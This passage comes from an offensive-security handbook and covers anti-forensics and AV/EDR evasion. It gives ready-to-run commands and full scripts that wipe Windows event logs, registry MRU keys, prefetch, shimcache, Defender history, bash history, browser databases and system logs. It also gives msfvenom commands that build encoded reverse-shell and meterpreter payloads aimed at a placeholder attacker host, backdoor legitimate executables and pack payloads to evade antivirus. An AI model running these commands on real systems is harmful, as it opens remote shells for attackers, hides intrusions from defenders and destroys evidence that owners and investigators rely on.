# Last Visited MRU
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU
```

**Technique: PowerShell Registry Cleanup**

```powershell
# Remove RecentDocs entries
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\*" -Recurse -Force

# Remove typed URLs
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\TypedURLs" -Name "*" -ErrorAction SilentlyContinue

# Clear RunMRU (Run dialog history)
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue

# Clear UserAssist (requires decoding)
$userAssistPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count"
Remove-Item -Path $userAssistPath -Recurse -Force -ErrorAction SilentlyContinue

# Clear LastVisitedPidlMRU
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU" -Recurse -Force

# Clear OpenSaveMRU
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU" -Recurse -Force
```

**Technique: Command Prompt Registry Cleanup**

```cmd
REM Delete entire RecentDocs key
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f

REM Delete specific value
reg delete "HKCU\Software\Microsoft\Internet Explorer\TypedURLs" /v url1 /f

REM Delete RunMRU
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f

REM Export, modify, and reimport (selective cleanup)
reg export "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" C:\temp\backup.reg
REM Edit backup.reg to remove specific entries
reg import C:\temp\backup_modified.reg
```

**Technique: Clear Jump Lists**

```powershell
# Jump lists location
$jumpListPath = "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations"
Remove-Item -Path "$jumpListPath\*" -Force

$customJumpListPath = "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations"
Remove-Item -Path "$customJumpListPath\*" -Force

# Clear Recent Items folder
Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\*" -Force
```

**Technique: Clear Windows Defender History**

```powershell
# Windows Defender scan history
Remove-Item -Path "C:\ProgramData\Microsoft\Windows Defender\Scans\History\*" -Recurse -Force

# Registry keys
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Scans" -Recurse -Force -ErrorAction SilentlyContinue

# Event logs
Clear-EventLog -LogName "Microsoft-Windows-Windows Defender/Operational" -ErrorAction SilentlyContinue
```

**Technique: Clear Prefetch Data**

```powershell
# Prefetch files reveal program execution
Remove-Item -Path "C:\Windows\Prefetch\*" -Force

# Disable prefetch via registry
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 0
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnableSuperfetch" -Value 0
```

**Technique: Clear Shimcache (Application Compatibility Cache)**

```powershell
# Shimcache tracks program execution
# Cannot be directly cleared while system is running
# Must delete registry key and reboot

# Backup and delete
reg export "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" C:\temp\shimcache_backup.reg
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" /f

# Alternative: Use third-party tools like ShimCacheParser to analyze first
```

**Technique: Clear BAM/DAM Keys (Background Activity Moderator)**

```powershell
# BAM tracks program execution with timestamps
# Windows 10 1809+

Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\*" -Recurse -Force
Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\dam\State\UserSettings\*" -Recurse -Force
```

### Bash History Removal

Bash history tracks command execution and is a primary forensic artifact on Linux systems.

#### Bash History Locations

```bash
# User bash history
~/.bash_history
~/.bash_eternal_history  # If configured

# Root bash history
/root/.bash_history

# Other shell histories
~/.zsh_history
~/.sh_history
~/.ksh_history
```

**Technique: Complete History Deletion**

```bash
# Clear current session history
history -c

# Delete history file
rm -f ~/.bash_history

# Clear and delete in one command
history -c && rm -f ~/.bash_history

# For current user and root
rm -f ~/.bash_history
rm -f /root/.bash_history

# Clear history and exit (prevents history writing on exit)
cat /dev/null > ~/.bash_history && history -c && exit
```

**Technique: Selective History Deletion**

```bash
# View history with line numbers
history

# Delete specific command by number
history -d 1234

# Delete last command
history -d $(history | tail -n 2 | head -n 1 | awk '{print $1}')

# Delete range of commands
for i in {1230..1250}; do history -d 1230; done

# Delete multiple specific entries
history -d 100 && history -d 200 && history -d 300
```

**Technique: History Manipulation with sed**

```bash
# Remove lines containing specific strings
sed -i '/sensitive_command/d' ~/.bash_history

# Remove lines with IP addresses
sed -i '/192.168.1.100/d' ~/.bash_history

# Remove lines with password keyword
sed -i '/password/d' ~/.bash_history
sed -i '/passwd/d' ~/.bash_history

# Remove multiple patterns
sed -i -e '/wget/d' -e '/curl/d' -e '/nc/d' ~/.bash_history

# Remove commands executed at specific time (if HISTTIMEFORMAT is set)
sed -i '/Oct 12 14:/,+1d' ~/.bash_history
```

**Technique: Prevent History Logging**

```bash
# Disable history for current session
unset HISTFILE

# Set history size to 0
export HISTSIZE=0
export HISTFILESIZE=0

# Prepend space to commands (won't be logged if HISTCONTROL=ignorespace)
 sensitive_command

# Set HISTCONTROL
export HISTCONTROL=ignorespace:ignoredups

# Disable history permanently in .bashrc
echo 'export HISTSIZE=0' >> ~/.bashrc
echo 'export HISTFILESIZE=0' >> ~/.bashrc
echo 'unset HISTFILE' >> ~/.bashrc

# Alternative: Redirect history to /dev/null
ln -sf /dev/null ~/.bash_history

# Make history file immutable (prevents writing)
chattr +i ~/.bash_history
# Remove when needed
chattr -i ~/.bash_history
```

**Technique: Execute Commands Without History**

```bash
# Method 1: Prepend with space (if HISTCONTROL=ignorespace)
 malicious_command

# Method 2: Use subshell without history
bash -c 'malicious_command' 

# Method 3: Temporarily disable history
set +o history
malicious_command
set -o history

# Method 4: Execute from file without sourcing
bash <(echo 'malicious_command')

# Method 5: Kill history writing on session close
kill -9 $$  # Terminates without writing history
```

**Technique: History Obfuscation**

```bash
# Fill history with benign commands
for i in {1..1000}; do
    history -s "ls -la"
    history -s "cd /tmp"
    history -s "pwd"
done

# Write benign history
cat > ~/.bash_history << 'EOF'
ls -la
cd /home
pwd
whoami
date
EOF
```

**Technique: Clear History Across Multiple Users**

```bash
# Clear history for all users (requires root)
for user_home in /home/*; do
    rm -f "$user_home/.bash_history"
done

# Clear root history
rm -f /root/.bash_history

# Alternative: Find and delete all bash history files
find / -name ".bash_history" -type f -delete 2>/dev/null
```

### Browser History Cleanup

Browser history, cookies, and cache contain significant forensic evidence of attacker reconnaissance and lateral movement.

#### Firefox History Cleanup

**Firefox Data Locations**

```bash
# Linux
~/.mozilla/firefox/[profile].default/places.sqlite  # History and bookmarks
~/.mozilla/firefox/[profile].default/cookies.sqlite
~/.mozilla/firefox/[profile].default/formhistory.sqlite
~/.mozilla/firefox/[profile].default/cache2/

# Windows
%APPDATA%\Mozilla\Firefox\Profiles\[profile].default\places.sqlite
%APPDATA%\Mozilla\Firefox\Profiles\[profile].default\cookies.sqlite
```

**Technique: SQLite Database Manipulation**

```bash
# Install sqlite3
apt-get install sqlite3

# Identify Firefox profile
firefox_profile=$(find ~/.mozilla/firefox/ -name "*.default*" -type d | head -n 1)

# Backup database
cp "$firefox_profile/places.sqlite" /tmp/places.sqlite.bak

# Open database

sqlite3 "$firefox_profile/places.sqlite"

# Within SQLite prompt:

# View tables

.tables

# View history entries

SELECT * FROM moz_places LIMIT 10;

# Delete all history

DELETE FROM moz_places; DELETE FROM moz_historyvisits;

# Delete specific URLs

DELETE FROM moz_places WHERE url LIKE '%malicious.com%'; DELETE FROM moz_historyvisits WHERE place_id IN (SELECT id FROM moz_places WHERE url LIKE '%malicious.com%');

# Delete history from specific time range

DELETE FROM moz_historyvisits WHERE visit_date > 1633046400000000 AND visit_date < 1633132800000000;

# Vacuum database to clean up

VACUUM;

# Exit

.quit

````

**Technique: Automated Firefox Cleanup Script**

```bash
cat > firefox_cleanup.sh << 'EOF'
#!/bin/bash

# Find Firefox profile directory
PROFILE=$(find ~/.mozilla/firefox/ -name "*.default*" -type d | head -n 1)

if [ -z "$PROFILE" ]; then
    echo "Firefox profile not found"
    exit 1
fi

echo "Found Firefox profile: $PROFILE"

# Kill Firefox if running
pkill firefox

# Wait for Firefox to close
sleep 2

# Delete specific databases
rm -f "$PROFILE/places.sqlite"
rm -f "$PROFILE/places.sqlite-wal"
rm -f "$PROFILE/places.sqlite-shm"
rm -f "$PROFILE/cookies.sqlite"
rm -f "$PROFILE/formhistory.sqlite"
rm -f "$PROFILE/downloads.sqlite"

# Clear cache
rm -rf "$PROFILE/cache2/"
rm -rf "$PROFILE/OfflineCache/"

# Clear session data
rm -f "$PROFILE/sessionstore.jsonlz4"
rm -f "$PROFILE/sessionstore-backups/"*

echo "Firefox cleanup complete"
EOF

chmod +x firefox_cleanup.sh
./firefox_cleanup.sh
````

**Technique: Selective URL Deletion**

```bash
# Delete specific domains from history
firefox_profile=$(find ~/.mozilla/firefox/ -name "*.default*" -type d | head -n 1)

sqlite3 "$firefox_profile/places.sqlite" << 'EOF'
DELETE FROM moz_places WHERE url LIKE '%attacker-site.com%';
DELETE FROM moz_places WHERE url LIKE '%192.168.1.100%';
DELETE FROM moz_places WHERE url LIKE '%exploit-db%';
DELETE FROM moz_historyvisits WHERE place_id NOT IN (SELECT id FROM moz_places);
VACUUM;
EOF
```

#### Chrome/Chromium History Cleanup

**Chrome Data Locations**

```bash
# Linux
~/.config/google-chrome/Default/History
~/.config/google-chrome/Default/Cookies
~/.config/google-chrome/Default/Cache/

# Windows
%LOCALAPPDATA%\Google\Chrome\User Data\Default\History
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies
```

**Technique: Chrome SQLite Manipulation**

```bash
# Kill Chrome
pkill chrome
pkill chromium

# Chrome profile location
chrome_profile="$HOME/.config/google-chrome/Default"

# Backup
cp "$chrome_profile/History" /tmp/History.bak

# Open database
sqlite3 "$chrome_profile/History"

# Within SQLite:
# View tables
.tables

# View URLs
SELECT * FROM urls LIMIT 10;

# Delete all history
DELETE FROM urls;
DELETE FROM visits;
DELETE FROM visit_source;
DELETE FROM downloads;
DELETE FROM downloads_url_chains;

# Delete specific URLs
DELETE FROM urls WHERE url LIKE '%malicious.com%';
DELETE FROM visits WHERE url IN (SELECT id FROM urls WHERE url LIKE '%malicious.com%');

# Delete by time range (Chrome uses WebKit timestamp)
# Convert: Unix timestamp * 1000000 + 11644473600000000
DELETE FROM visits WHERE visit_time > 13296000000000000 AND visit_time < 13296086400000000;
DELETE FROM urls WHERE id NOT IN (SELECT url FROM visits);

VACUUM;
.quit
```

**Technique: Chrome Cookies Cleanup**

```bash
chrome_profile="$HOME/.config/google-chrome/Default"

sqlite3 "$chrome_profile/Cookies" << 'EOF'
.tables
DELETE FROM cookies WHERE host_key LIKE '%attacker-site.com%';
DELETE FROM cookies WHERE name LIKE '%session%';
VACUUM;
EOF
```

**Technique: Complete Chrome Data Deletion**

```bash
# Kill Chrome
pkill chrome

# Delete all Chrome data
rm -rf ~/.config/google-chrome/Default/History*
rm -rf ~/.config/google-chrome/Default/Cookies*
rm -rf ~/.config/google-chrome/Default/Cache/
rm -rf ~/.config/google-chrome/Default/GPUCache/
rm -rf ~/.config/google-chrome/Default/"Service Worker"/
rm -rf ~/.config/google-chrome/Default/Local\ Storage/
rm -rf ~/.config/google-chrome/Default/Session\ Storage/
rm -rf ~/.config/google-chrome/Default/Download\ History*

# For all profiles
rm -rf ~/.config/google-chrome/*/History*
rm -rf ~/.config/google-chrome/*/Cookies*
rm -rf ~/.config/google-chrome/*/Cache/
```

**Technique: Automated Chrome Cleanup Script**

```bash
cat > chrome_cleanup.sh << 'EOF'
#!/bin/bash

# Chrome profile directory
CHROME_DIR="$HOME/.config/google-chrome"
CHROMIUM_DIR="$HOME/.config/chromium"

cleanup_profile() {
    local profile_dir="$1"
    
    if [ ! -d "$profile_dir" ]; then
        return
    fi
    
    echo "Cleaning: $profile_dir"
    
    # Kill browser
    pkill -9 chrome
    pkill -9 chromium
    
    sleep 1
    
    # Delete files
    rm -f "$profile_dir/History"*
    rm -f "$profile_dir/Cookies"*
    rm -f "$profile_dir/Web Data"*
    rm -f "$profile_dir/Download History"*
    rm -rf "$profile_dir/Cache/"
    rm -rf "$profile_dir/Code Cache/"
    rm -rf "$profile_dir/GPUCache/"
    rm -rf "$profile_dir/Service Worker/"
    rm -rf "$profile_dir/Local Storage/"
    rm -rf "$profile_dir/Session Storage/"
    
    echo "Cleanup complete for: $profile_dir"
}

# Clean all Chrome profiles
for profile in "$CHROME_DIR"/*/; do
    cleanup_profile "$profile"
done

# Clean all Chromium profiles
for profile in "$CHROMIUM_DIR"/*/; do
    cleanup_profile "$profile"
done

echo "All browser data cleaned"
EOF

chmod +x chrome_cleanup.sh
./chrome_cleanup.sh
```

#### Windows Browser Cleanup

**Technique: PowerShell Chrome Cleanup**

```powershell
# Stop Chrome process
Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue

# Chrome user data location
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"

# Delete history
Remove-Item "$chromePath\History" -Force -ErrorAction SilentlyContinue
Remove-Item "$chromePath\History-journal" -Force -ErrorAction SilentlyContinue

# Delete cookies
Remove-Item "$chromePath\Cookies" -Force -ErrorAction SilentlyContinue
Remove-Item "$chromePath\Cookies-journal" -Force -ErrorAction SilentlyContinue

# Delete cache
Remove-Item "$chromePath\Cache\*" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "$chromePath\Code Cache\*" -Recurse -Force -ErrorAction SilentlyContinue

# Delete downloads history
Remove-Item "$chromePath\Download History" -Force -ErrorAction SilentlyContinue

# Clear local storage
Remove-Item "$chromePath\Local Storage\*" -Recurse -Force -ErrorAction SilentlyContinue
```

**Technique: PowerShell Firefox Cleanup**

```powershell
# Stop Firefox
Stop-Process -Name firefox -Force -ErrorAction SilentlyContinue

# Find Firefox profile
$firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*.default*" -Directory

foreach ($profile in $firefoxProfiles) {
    Write-Host "Cleaning profile: $($profile.FullName)"
    
    # Delete databases
    Remove-Item "$($profile.FullName)\places.sqlite" -Force -ErrorAction SilentlyContinue
    Remove-Item "$($profile.FullName)\places.sqlite-wal" -Force -ErrorAction SilentlyContinue
    Remove-Item "$($profile.FullName)\places.sqlite-shm" -Force -ErrorAction SilentlyContinue
    Remove-Item "$($profile.FullName)\cookies.sqlite" -Force -ErrorAction SilentlyContinue
    Remove-Item "$($profile.FullName)\formhistory.sqlite" -Force -ErrorAction SilentlyContinue
    
    # Delete cache
    Remove-Item "$($profile.FullName)\cache2\*" -Recurse -Force -ErrorAction SilentlyContinue
}
```

**Technique: Edge Browser Cleanup**

```powershell
# Stop Edge
Stop-Process -Name msedge -Force -ErrorAction SilentlyContinue

# Edge user data location
$edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"

# Delete history
Remove-Item "$edgePath\History" -Force -ErrorAction SilentlyContinue
Remove-Item "$edgePath\History-journal" -Force -ErrorAction SilentlyContinue

# Delete cookies
Remove-Item "$edgePath\Cookies" -Force -ErrorAction SilentlyContinue

# Delete cache
Remove-Item "$edgePath\Cache\*" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "$edgePath\Code Cache\*" -Recurse -Force -ErrorAction SilentlyContinue
```

**Technique: Internet Explorer Cleanup**

```powershell
# Clear IE history using RunDll32
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 8    # Temporary Internet Files
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 2    # Cookies
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 1    # History
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 16   # Form Data
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 32   # Passwords
RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 255  # All

# Manual deletion
Remove-Item "$env:LOCALAPPDATA\Microsoft\Windows\History\*" -Recurse -Force
Remove-Item "$env:LOCALAPPDATA\Microsoft\Windows\Temporary Internet Files\*" -Recurse -Force
Remove-Item "$env:APPDATA\Microsoft\Windows\Cookies\*" -Recurse -Force

# Clear IE index.dat files
Remove-Item "$env:LOCALAPPDATA\Microsoft\Windows\History\History.IE5\index.dat" -Force
Remove-Item "$env:LOCALAPPDATA\Microsoft\Windows\Temporary Internet Files\Content.IE5\index.dat" -Force
```

#### Advanced Browser Cleanup

**Technique: Private Browsing Detection and Cleanup**

```bash
# Check for private browsing artifacts that shouldn't exist
# Firefox Private Browsing Session
firefox_profile=$(find ~/.mozilla/firefox/ -name "*.default*" -type d | head -n 1)

# Check for private browsing recovery files
ls -la "$firefox_profile/sessionstore-backups/"

# Remove any private session recovery
rm -f "$firefox_profile/sessionstore-backups/recovery.jsonlz4"
rm -f "$firefox_profile/sessionstore-backups/previous.jsonlz4"
```

**Technique: Browser Extension Data Cleanup**

```bash
# Chrome extensions store data locally
chrome_profile="$HOME/.config/google-chrome/Default"

# List extensions
ls "$chrome_profile/Extensions/"

# Clear extension local storage
rm -rf "$chrome_profile/Extensions/*/Storage/"
rm -rf "$chrome_profile/Extensions/*/Local Storage/"

# Firefox addons
firefox_profile=$(find ~/.mozilla/firefox/ -name "*.default*" -type d | head -n 1)
rm -rf "$firefox_profile/storage/default/"
rm -rf "$firefox_profile/extensions/storage/"
```

**Technique: Clear Browser Autofill Data**

```bash
# Chrome autofill data
chrome_profile="$HOME/.config/google-chrome/Default"

sqlite3 "$chrome_profile/Web Data" << 'EOF'
DELETE FROM autofill;
DELETE FROM autofill_profiles;
DELETE FROM autofill_profile_names;
DELETE FROM autofill_profile_emails;
DELETE FROM autofill_profile_phones;
DELETE FROM credit_cards;
VACUUM;
EOF

# Firefox form history
firefox_profile=$(find ~/.mozilla/firefox/ -name "*.default*" -type d | head -n 1)

sqlite3 "$firefox_profile/formhistory.sqlite" << 'EOF'
DELETE FROM moz_formhistory;
VACUUM;
EOF
```

**Technique: DNS Cache Cleanup**

[Inference] Browsers cache DNS lookups which can reveal visited domains even after history deletion:

```bash
# Linux - clear system DNS cache
# systemd-resolved
systemctl restart systemd-resolved

# dnsmasq
systemctl restart dnsmasq

# nscd
systemctl restart nscd

# Manual clear
echo "nameserver 8.8.8.8" > /etc/resolv.conf
```

```powershell
# Windows - clear DNS cache
ipconfig /flushdns

# Clear DNS client cache via PowerShell
Clear-DnsClientCache
```

### Comprehensive Cleanup Script

**Technique: All-in-One Linux Cleanup**

```bash
cat > comprehensive_cleanup.sh << 'EOF'
#!/bin/bash

echo "[*] Starting comprehensive cleanup..."

# Check if running as root
if [ "$EUID" -ne 0 ]; then 
    echo "[!] Warning: Not running as root. Some operations may fail."
fi

# 1. Clear system logs
echo "[+] Clearing system logs..."
find /var/log -type f -exec truncate -s 0 {} \; 2>/dev/null
journalctl --rotate 2>/dev/null
journalctl --vacuum-time=1s 2>/dev/null

# 2. Clear bash history
echo "[+] Clearing bash history..."
history -c
cat /dev/null > ~/.bash_history
cat /dev/null > /root/.bash_history 2>/dev/null
for home in /home/*; do
    cat /dev/null > "$home/.bash_history" 2>/dev/null
done

# 3. Clear browser data
echo "[+] Clearing browser data..."
pkill firefox 2>/dev/null
pkill chrome 2>/dev/null
pkill chromium 2>/dev/null

# Firefox cleanup
for profile in ~/.mozilla/firefox/*.default*/; do
    rm -f "$profile/places.sqlite"*
    rm -f "$profile/cookies.sqlite"*
    rm -rf "$profile/cache2/"
done

# Chrome cleanup
for profile in ~/.config/google-chrome/*/; do
    rm -f "$profile/History"*
    rm -f "$profile/Cookies"*
    rm -rf "$profile/Cache/"
done

# 4. Clear temporary files
echo "[+] Clearing temporary files..."
rm -rf /tmp/*
rm -rf /var/tmp/*
rm -rf ~/.cache/*

# 5. Clear auth logs specifically
echo "[+] Clearing authentication logs..."
> /var/log/auth.log
> /var/log/secure
> /var/log/wtmp
> /var/log/btmp

# 6. Clear systemd journal
echo "[+] Clearing systemd journal..."
rm -rf /var/log/journal/*
rm -rf /run/log/journal/*

# 7. Clear command history for all users
echo "[+] Clearing command history..."
find /home -name ".bash_history" -delete 2>/dev/null
find /root -name ".bash_history" -delete 2>/dev/null
find /home -name ".zsh_history" -delete 2>/dev/null

# 8. Clear recent file lists
echo "[+] Clearing recent files..."
rm -f ~/.recently-used
rm -rf ~/.local/share/recently-used.xbel

# 9. Clear thumbnail cache
echo "[+] Clearing thumbnail cache..."
rm -rf ~/.cache/thumbnails/*
rm -rf ~/.thumbnails/*

echo "[*] Cleanup complete!"
echo "[!] Remember to: unset HISTFILE && exit"
EOF

chmod +x comprehensive_cleanup.sh
```

**Technique: All-in-One Windows Cleanup**

```powershell
# comprehensive_cleanup.ps1
Write-Host "[*] Starting comprehensive Windows cleanup..." -ForegroundColor Green

# Require admin
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "Please run as Administrator"
    exit
}

# 1. Clear Event Logs
Write-Host "[+] Clearing Event Logs..." -ForegroundColor Yellow
wevtutil el | ForEach-Object { wevtutil cl "$_" 2>$null }

# 2. Clear PowerShell History
Write-Host "[+] Clearing PowerShell history..." -ForegroundColor Yellow
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
Clear-History

# 3. Clear Browser Data
Write-Host "[+] Clearing browser data..." -ForegroundColor Yellow
Stop-Process -Name chrome,firefox,msedge -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

# Chrome
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
Remove-Item "$chromePath\History*" -Force -ErrorAction SilentlyContinue
Remove-Item "$chromePath\Cookies*" -Force -ErrorAction SilentlyContinue
Remove-Item "$chromePath\Cache\*" -Recurse -Force -ErrorAction SilentlyContinue

# Edge
$edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
Remove-Item "$edgePath\History*" -Force -ErrorAction SilentlyContinue
Remove-Item "$edgePath\Cookies*" -Force -ErrorAction SilentlyContinue

# 4. Clear Registry Recent Items
Write-Host "[+] Clearing registry artifacts..." -ForegroundColor Yellow
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\*" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse -Force -ErrorAction SilentlyContinue

# 5. Clear Prefetch
Write-Host "[+] Clearing prefetch..." -ForegroundColor Yellow
Remove-Item -Path "C:\Windows\Prefetch\*" -Force -ErrorAction SilentlyContinue

# 6. Clear Temp Files
Write-Host "[+] Clearing temporary files..." -ForegroundColor Yellow
Remove-Item -Path "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "C:\Windows\Temp\*" -Recurse -Force -ErrorAction SilentlyContinue

# 7. Clear Recent Items
Write-Host "[+] Clearing recent items..." -ForegroundColor Yellow
Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue

# 8. Clear DNS Cache
Write-Host "[+] Clearing DNS cache..." -ForegroundColor Yellow
Clear-DnsClientCache

# 9. Clear Windows Defender Logs
Write-Host "[+] Clearing Windows Defender logs..." -ForegroundColor Yellow
Remove-Item -Path "C:\ProgramData\Microsoft\Windows Defender\Scans\History\*" -Recurse -Force -ErrorAction SilentlyContinue

Write-Host "[*] Cleanup complete!" -ForegroundColor Green
Write-Host "[!] Consider rebooting for full effect" -ForegroundColor Cyan
```

### Important Related Topics

**Critical subtopics for comprehensive understanding:**

- **Anti-forensics techniques** - Advanced methods to defeat forensic analysis tools and methodologies
- **Memory artifacts cleanup** - Removing evidence from RAM, swap files, and hibernation files
- **Network artifacts removal** - Clearing firewall logs, connection logs, and network monitoring data
- **Database audit log manipulation** - Covering tracks in application and database audit trails
- **Cloud service artifact removal** - Cleaning logs and traces in cloud environments (AWS CloudTrail, Azure Activity Logs)

---

# EVASION & OBFUSCATION

## AV/EDR Evasion

### Encoder Chains (MSF)

Metasploit Framework provides encoding mechanisms to obfuscate payloads and evade signature-based detection. **[Inference]** Modern AVs detect single encoders easily, requiring multiple encoding iterations or custom approaches.

**Basic Encoding Syntax:**

```bash
# Single encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -e x86/shikata_ga_nai -f exe -o payload.exe

# Multiple iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe

# Encoder chain (multiple different encoders)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -e x86/shikata_ga_nai -i 5 -e x86/fnstenv_mov -i 3 -f exe -o payload.exe
```

**Available Encoders:**

```bash
# List all encoders
msfvenom --list encoders

# Common x86 encoders
x86/shikata_ga_nai          # Polymorphic XOR additive feedback (excellent)
x86/jmp_call_additive       # Jump/Call XOR Additive
x86/call4_dword_xor         # Call+4 Dword XOR
x86/countdown               # Single-byte XOR Countdown
x86/fnstenv_mov             # Variable-length Fnstenv/mov Dword XOR

# x64 encoders
x64/xor                     # XOR Encoder
x64/xor_dynamic             # Dynamic XOR
x64/zutto_dekiru            # Zutto Dekiru

# Architecture-agnostic
generic/none                # No encoding
cmd/powershell_base64       # PowerShell Base64
```

**Architecture-Specific Encoding:**

```bash
# Windows x86
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -a x86 --platform windows -e x86/shikata_ga_nai -i 15 -f exe -o shell_x86.exe

# Windows x64
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -a x64 --platform windows -e x64/xor_dynamic -i 10 -f exe -o shell_x64.exe

# Linux x86
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -e x86/shikata_ga_nai -i 10 -f elf -o shell_linux

# Linux x64
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -e x64/xor_dynamic -i 8 -f elf -o shell_linux64
```

**Format-Specific Encoding:**

```bash
# Raw shellcode with encoding
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -e x86/shikata_ga_nai -i 10 -f raw -o shellcode.bin

# C array format
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -e x86/shikata_ga_nai -i 10 -f c

# Python format
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -e x86/shikata_ga_nai -i 10 -f python

# PowerShell format
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -e cmd/powershell_base64 -f psh -o payload.ps1

# VBA format (for Office macros)
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -e x86/shikata_ga_nai -f vba -o payload.vba
```

**Template-Based Evasion:**

```bash
# Use custom template (replaces default executable)
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -e x86/shikata_ga_nai -x /path/to/legitimate.exe -k -f exe -o payload.exe

# -x: specify template executable
# -k: keep template behavior (payload runs in separate thread)

# Common templates
-x /usr/share/windows-binaries/putty.exe
-x /usr/share/windows-binaries/nc.exe
-x /path/to/custom_legitimate.exe
```

**Limitations of MSF Encoding:**

**[Unverified - behavior depends on specific AV versions]** Most modern AVs detect common MSF encoders due to:

- Known encoder stubs
- Behavioral analysis during decoding
- Entropy analysis
- Heuristic detection of self-modifying code

**Advanced Encoder Chain Example:**

```bash
# Multi-stage encoding with template
msfvenom -p windows/meterpreter/reverse_https LHOST=<attacker_ip> LPORT=443 \
  -e x86/shikata_ga_nai -i 10 \
  -e x86/call4_dword_xor -i 5 \
  -e x86/countdown -i 3 \
  -x /usr/share/windows-binaries/putty.exe -k \
  -f exe -o advanced_payload.exe
```

**Custom Encoder Development:**

Metasploit Ruby encoder template:

```ruby
require 'msf/core'

class MetasploitModule < Msf::Encoder
  Rank = NormalRanking

  def initialize
    super(
      'Name'        => 'Custom XOR Encoder',
      'Description' => 'Custom XOR encoding scheme',
      'Author'      => 'YourName',
      'Arch'        => ARCH_X86,
      'License'     => MSF_LICENSE
    )
  end

  def encode_block(state, block)
    # Custom encoding logic
    key = 0xAA
    encoded = ''
    block.each_byte { |byte| encoded << (byte ^ key).chr }
    return encoded
  end
end
```

Save to: `~/.msf4/modules/encoders/x86/custom_xor.rb`

### Packing and Encryption

Packers compress and encrypt executables, making static analysis difficult. **[Inference]** Packed payloads may trigger heuristic detection due to high entropy and unpacking behavior.

**UPX (Ultimate Packer for eXecutables):**

```bash
# Basic packing
upx -9 payload.exe

# Ultra brute compression
upx --best --ultra-brute payload.exe

# Custom compression
upx -9 --compress-icons=0 payload.exe

# Verify packing
upx -t payload.exe

# Unpack (for testing)
upx -d payload.exe
```

**UPX Limitations:**

- Widely signatured by AVs
- Easy to unpack
- **[Inference]** Modern AVs automatically unpack UPX before scanning

**Alternative Packers:**

**Themida/WinLicense (Windows):**

```bash
# Commercial packer with strong anti-debugging
# GUI-based, requires Windows
